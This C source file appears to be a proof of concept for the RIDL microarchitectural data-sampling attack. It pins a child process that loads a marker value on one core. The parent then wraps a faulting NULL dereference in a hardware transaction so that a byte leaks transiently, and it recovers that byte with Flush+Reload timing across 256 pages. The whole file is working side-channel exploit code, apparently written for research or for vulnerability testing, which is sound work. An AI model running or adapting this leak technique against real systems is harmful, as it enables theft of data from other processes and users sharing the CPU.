#define _GNU_SOURCE
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/prctl.h>

#include "cacheutils.h"
#include "microarchitecture.h"

extern void __attribute__((noreturn)) load_magic_value(void* flush_target);

int ridl_generic_c(uint32_t num_samples, uint32_t success_rate) {
    pid_t pid;
    int pair[] = {2, 6};

    uint32_t num_hits[0x100] = {0, };

    if(!CACHE_MISS)
        CACHE_MISS = detect_flush_reload_threshold();
    printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

    pagesize = sysconf(_SC_PAGESIZE);
    char* _mem = (char*)malloc(pagesize*300);
    mem = (char*)(((size_t)_mem & ~(pagesize-1)) + pagesize*2);

    pid = fork();
    set_processor_affinity(pair[pid ? 0 : 1]);
    if (!pid) {
        prctl(PR_SET_PDEATHSIG, SIGHUP);
        load_magic_value(load_magic_value);
        __builtin_unreachable();
    }
    usleep(10000);
    flush_shared_memory();

    for(uint32_t i = 0; i < num_samples; i++) {
        if(try_start()) {
            maccess(mem + *(size_t*)NULL * pagesize);
            try_abort();
        }
        try_end();

        for(int i = 0; i < 256; i++) {
            int mix_i = ((i * 167) + 13) % 256;
            if (mix_i != 0 && flush_reload(mem + mix_i * pagesize)) {
                num_hits[mix_i]++;
            }
        }
    }

    for(int i = 0; i < 256; i++) {
        printf("0x%02x: %u\n", i, num_hits[i]);
    }

    return 0;
}

